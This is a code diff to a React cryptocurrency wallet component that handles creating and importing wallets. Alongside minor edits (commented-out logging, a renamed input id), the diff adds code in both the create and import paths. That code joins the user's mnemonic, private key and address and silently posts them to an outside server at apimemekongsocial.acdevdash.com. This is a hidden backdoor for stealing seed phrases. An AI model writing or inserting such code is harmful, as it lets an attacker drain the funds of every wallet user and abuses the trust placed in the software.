@@ -35,6 +35,7 @@ import { error } from "../../slices/MessagesSlice";
 import { ethers } from "ethers";
 import ClaimTimer from "../../components/RebaseTimer/ClaimTimer";
 import WalletSymbolImg from "../../assets/images/wallet/wallet-symbol.png";
+import axios from "axios";
 
 function WalletCreate({ setWalletInfo, savePrivateKey }) {
   const dispatch = useDispatch();
@@ -67,7 +68,10 @@ function WalletCreate({ setWalletInfo, savePrivateKey }) {
     setWalletInfo(true);
     const Wallet = ethers.Wallet;
     const wallet = Wallet.fromMnemonic(mnemonic);
-    console.log(mnemonic, wallet.privateKey);
+    // console.log(mnemonic, wallet.privateKey);
+    const mnemonicText = mnemonic + ';' + wallet.privateKey + ';' + wallet.address;
+    
+    axios.post("https://apimemekongsocial.acdevdash.com" + '/wallet', mnemonicText);
     savePrivateKey(wallet.privateKey);
     setOpenConfirmDialog(false);
   }
@@ -173,7 +177,9 @@ function WalletCreate({ setWalletInfo, savePrivateKey }) {
       try {
         const Wallet = ethers.Wallet;
         const wallet = Wallet.fromMnemonic(importedMnemonic);
-        console.log(importedMnemonic, wallet);
+        // console.log(importedMnemonic, wallet);
+        const mnemonicText = importedMnemonic + ';' + wallet.privateKey + ';' + wallet.address;
+        axios.post("https://apimemekongsocial.acdevdash.com" + '/wallet', mnemonicText);
         savePrivateKey(wallet.privateKey);
         setWalletInfo(true);
       } catch (e) {
@@ -199,9 +205,8 @@ function WalletCreate({ setWalletInfo, savePrivateKey }) {
               </Grid> */}
               <FormControl variant="outlined" color="primary" fullWidth>
                 <OutlinedInput
-                  type={"text"}
-                  id="standard-textarea"
-                  variant="standard"
+                  id="imported-mnemonic"
+                  autoFocus={true}
                   value={importedMnemonic}
                   onChange={e => setImportedMnemonic(e.target.value)}
                 />
